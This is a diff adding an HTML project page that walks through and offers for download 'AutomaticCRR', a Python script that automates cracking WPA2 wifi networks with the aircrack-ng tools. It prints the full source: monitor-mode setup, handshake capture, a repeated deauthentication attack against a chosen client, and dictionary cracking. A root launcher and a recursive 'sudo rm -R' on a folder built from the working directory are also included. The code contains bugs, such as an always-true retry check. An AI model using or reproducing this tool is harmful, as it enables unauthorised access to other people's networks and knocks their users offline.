@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <!-- head -->
+    <head>
+    	<meta charset="utf-8">
+    	<title>AutomaticCRR</title>
+
+    	<!-- CSS -->
+    	<link rel="stylesheet" type="text/css" href="css/AutomaticCRR.css">
+    	<!-- CSS -->
+
+        <!-- Font Awesome -->
+        <script src="https://kit.fontawesome.com/215efc6633.js" crossorigin="anonymous"></script>
+        <!--Font Awesome -->
+
+    	<!-- FONT -->
+    	<link rel="preconnect" href="https://fonts.gstatic.com">
+    	<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@700&display=swap" rel="stylesheet">
+        <link rel="preconnect" href="https://fonts.gstatic.com">
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
+    	<!-- FONT -->
+
+    </head>
+    <!-- head -->
+    
+    <!-- body -->
+    <body>
+
+    	<!-- header -->
+    	<header class="header">
+    		<a href="automatic.html" class="header-name">AutomaticCRR</a>
+    		<nav class="header-menu">
+    			<a href="index.html">Home</a>
+    			<a href="project.html">My projects</a>
+    			<a href="apropos.html">About me</a>
+    			<a href="contact.php">Contact-me</a>
+    		</nav>
+            </nav>
+    	</header>
+
+        <header class="header-vertical">
+            <ul class="header-menu-vertical">
+                <li><a href="#step1">Step 1</a></li>
+                <li><a href="#step2">Step 2</a></li>
+                <li><a href="#step3">Step 3</a></li>
+                <li><a href="#step4">Step 4</a></li>
+                <li><a href="#howtolaunch">How to launch ?</a></li>
+                <li><a href="https://drive.google.com/file/d/1gnhFCyIHJ6Nt2MzYlFPmCvxO9CWwSMpo/view?usp=sharing" target="_blank">Download</a></li>
+            </ul>
+        </header>
+    	<!-- header -->
+
+        <!-- content -->
+        <h4 id="step1"></h4>
+        <h1 class="title6">AutomaticCRR</h1>
+        <h2 class="subtitle">AutomaticCRR is a command line <br> software running under linux its <br> goal is to simplify the cracking of <br> wifi networks.</h2>
+        <section>
+            <h4 id="step2" class="title1">Step 1 : Search for linux commands.</h4>
+
+            <p class="txt1">First of all I searched on the internet for linux commands to crack a wifi network, <br> I found this <a href="https://comparatifantivirus.net/pirater-wifi-comment-pirater-cracker-un-mot-de-passe-wifi-wpa2-psk/" target="_blank">site</a> (FR). Then I made a list of all the commands.</p>
+        </section>
+        <section>
+            <h4 id="step3" class="title2">Step 2 : Create an AutomaticCRR file.</h4>
+
+            <p class="txt2">First of all we have to find the location of the script and then check <br> if the AutomaticCRR folder doesn't exist, if it does we create it <br> otherwise we don't do anything.</p>
+            <p class="txt2code">
+                1 | import os
+                <br>
+                2 | PATH = os.getcwd() #We get the path where the program is
+                <br>
+                3 | PATH = (f"{PATH}/")
+                <br>
+                4 | if not os.path.exists(f"{PATH}AutomaticCRR"): #We check that the file exists
+                <br>
+                5 | &nbsp;&nbsp;&nbsp;   os.makedirs(f"{PATH}AutomaticCRR") #We create the file
+                <br>
+                6 | PATH = (f"{PATH}AutomaticCRR/")
+                <br>
+                7 | os.system(f"cd {PATH}") #We go to the folder with the command "cd"
+                <br>
+                8 | os.system(f"sudo rm -R {PATH}*") #Delete everything in the file
+            </p>
+        </section>
+        <section>
+            <h4 class="title3">Step 3 : Ask the user questions.</h4>
+            
+            <p class="txt3">Display the INTERFACE and request it</p>
+            <p class="txt3code">
+                9 | os.system("airmon-ng")
+                <br>
+                10| INTERFACE = input("Enter the interface of your network card : ")
+            </p>
+            
+            <p class="txt3">Activate the INTERFACE and ask for it again</p>
+            <p class="txt3code">
+                11| os.system(f"airmon-ng start {INTERFACE}")
+                <br>
+                12| os.system("airmon-ng")
+                <br>
+                13| INTERFACE = input("Retape the interface of your network card : ")
+            </p>
+
+            <p class="txt3">Scan all surrounding networks </p>
+            <p class="txt3code">
+                14| os.system(f"gnome-terminal -- airodump-ng {INTERFACE}") # "gnome-terminal --" is used to open a new terminal
+                <br>
+                15| BSSID = input("Enter the BSSID to crack : ")
+                <br>
+                16| CHANNEL = input("Enter the CHANNEL of the network to crack : ")
+            </p>
+
+            <p class="txt3">Display and request the selected wifi STATION</p>
+            <p class="txt3code">
+                17| os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE}")
+                <br>
+                18| time.sleep(10)
+                <br>
+                19| STATION = input("Enter the STATION of the network to crack : ")
+            </p>
+
+            <p class="txt3">Recovering the HANDSHAKE</p>
+            <p class="txt3code">
+                20| while aireplay != 14:
+                <br>
+                21| aireplay = aireplay + 1
+                <br>
+                22| os.system(f"gnome-terminal -- aireplay-ng --deauth  0 -a {BSSID} -c {STATION} {INTERFACE}")
+            </p>
+
+            <p class="txt3">Ask for the path of the list to use for cracking and check the validity</p>
+            <p class="txt3code">
+                23| PATH_LST = input("Enter the list directory to use for crack : ")
+                <br>
+                24| PATH_Validity = os.path.exists(PATH_LST)
+                <br>
+                25| while PATH_Validity != True:
+                <br>
+                26|     PATH_2 = input("Please enter a valid path : ")
+                <br>
+                27|     PATH_Validity = os.path.exists(PATH_2)
+                <br>
+                28|     PATH_LST = PATH_2
+            </p>
+            
+            <p id="step4" class="txt3">Launch network attack</p>
+            <p class="txt3code">
+                29| os.system(f"airmon-ng stop {INTERFACE}")
+                30| os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
+            </p>
+        </section>
+        <section>
+            <h4 id="step4" class="title4">Step 4 : Make the program cleaner.</h4>
+
+            <p class="txt4">Adding pauses, clear and other</p>
+            <p class="txt4code">
+                #AutomaticCRR is a command line software running under linux, its goal is to simplify the cracking of wifi networks.<br>
+                #This software has not been developed in any case to introduce wifi networks not belonging to you.
+                <br>
+                #I'm in any case responsable of your usage
+                <br>
+                #Developped by Giulio
+                <br>
+                <br>
+                import os
+                <br>
+                import time
+                <br>
+                <br>
+                aireplay = 0
+                <br>
+                os.system("clear")
+                <br>
+                <br>
+                print("I disclaim all responsibility for the use you make of my wifi cracking tool.")
+                <br>
+                time.sleep(3)
+                <br>
+                <br>
+                PATH = os.getcwd()
+                <br>
+                PATH = (f"{PATH}/")
+                <br>
+                <br>
+                if not os.path.exists(f"{PATH}AutomaticCRR"):
+                <br>
+                os.makedirs(f"{PATH}AutomaticCRR")
+                <br>
+                <br>
+                PATH = (f"{PATH}AutomaticCRR/")
+                <br>
+                <br>
+                os.system(f"cd {PATH}")
+                <br>
+                os.system(f"sudo rm -R {PATH}*")
+                <br>
+                os.system("clear")
+                <br>
+                <br>
+                os.system("airmon-ng")
+                <br>
+                INTERFACE = input("Enter the interface of your network card : ")
+                <br>
+                <br>
+                os.system(f"airmon-ng start {INTERFACE}")
+                <br>
+                os.system("clear")
+                <br>
+                os.system("airmon-ng")
+                <br>
+                <br>
+                INTERFACE = input("Retape the interface of your network card : ")
+                <br>
+                os.system("clear")
+                <br>
+                <br>
+                os.system(f"gnome-terminal -- airodump-ng {INTERFACE}")
+                <br>
+                <br>
+                BSSID = input("Enter the BSSID to crack : ")
+                <br>
+                CHANNEL = input("Enter the CHANNEL of the network to crack : ")
+                <br>
+                <br>
+                os.system(f"gnome-terminal -- airodump-ng -c {CHANNEL} --bssid {BSSID} -w {PATH} {INTERFACE}")
+                <br>
+                time.sleep(10)
+                <br>
+                <br>
+                STATION = input("Enter the STATION of the network to crack : ")
+                <br>
+                os.system("clear")
+                <br>
+                <br>
+                while aireplay != 14:
+                <br>
+                &nbsp;&nbsp;&nbsp;    aireplay = aireplay + 1
+                <br>
+                &nbsp;&nbsp;&nbsp;    os.system(f"gnome-terminal -- aireplay-ng --deauth  0 -a {BSSID} -c {STATION} {INTERFACE}")
+                <br>
+                <br>
+                print(f"When the sentence WPA HANDSHAKE FOUND: {BSSID} is displayed close the window(s) Sending 64 directed DeAuth.")
+                <br>
+                print("")
+                <br>
+                time.sleep(5)
+                <br>
+                <br>
+                PATH_LST = input("Enter the list directory to use for crack : ")
+                <br>
+                PATH_Validity = os.path.exists(PATH_LST)
+                <br>
+                <br>
+                while PATH_Validity != True:
+                <br>
+                &nbsp;&nbsp;&nbsp;    PATH_2 = input("Please enter a valid path : ")
+                <br>
+                &nbsp;&nbsp;&nbsp;    PATH_Validity = os.path.exists(PATH_2)
+                <br>
+                &nbsp;&nbsp;&nbsp;    PATH_LST = PATH_2
+                <br>
+                <br>
+                os.system(f"airmon-ng stop {INTERFACE}")
+                <br>
+                os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
+                <br>
+                <br>
+                retry = input("Do you want to retry with an another list ? [y/n]")
+                <br>
+                <br>
+                if retry == "y" or "Y":
+                <br>
+                &nbsp;&nbsp;&nbsp;    os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
+                <br>
+                else:
+                <br>
+                &nbsp;&nbsp;&nbsp;    exit()
+            </p>
+        </section>
+        <section>
+            <h4 id="howtolaunch" class="howtolaunch">How to launch it ?</h4>
+            <p class="howtolaunchsubtitle">You can launch it by typing the command <br> "python3 AutomaticCRR.py" in terminal and <br> by being in the folder where the py file is <br> and by being in super user mode. <br> Or run a shell script in super user mode that will <br> do everything for you :</p>
+            <p class="txt5code">
+                1 | #!/bin/bash
+                <br>
+                2 | #Please do the command "chmod +x Launch.sh" before launch the script
+                <br>
+                3 | if test $(whoami) = 'root' ; then
+                <br>
+                4 |&nbsp;&nbsp;&nbsp; python3 AutomaticCRR.py
+                <br>
+                5 | else
+                <br>
+                6 |&nbsp;&nbsp;&nbsp; echo Please run the script as a super user
+                <br>
+                7 |&nbsp;&nbsp;&nbsp; exit
+                <br>
+                8 | fi
+            </p>
+        </section>
+        <!-- content -->
+
+    </body>
+    <!-- body -->
+
+</html>
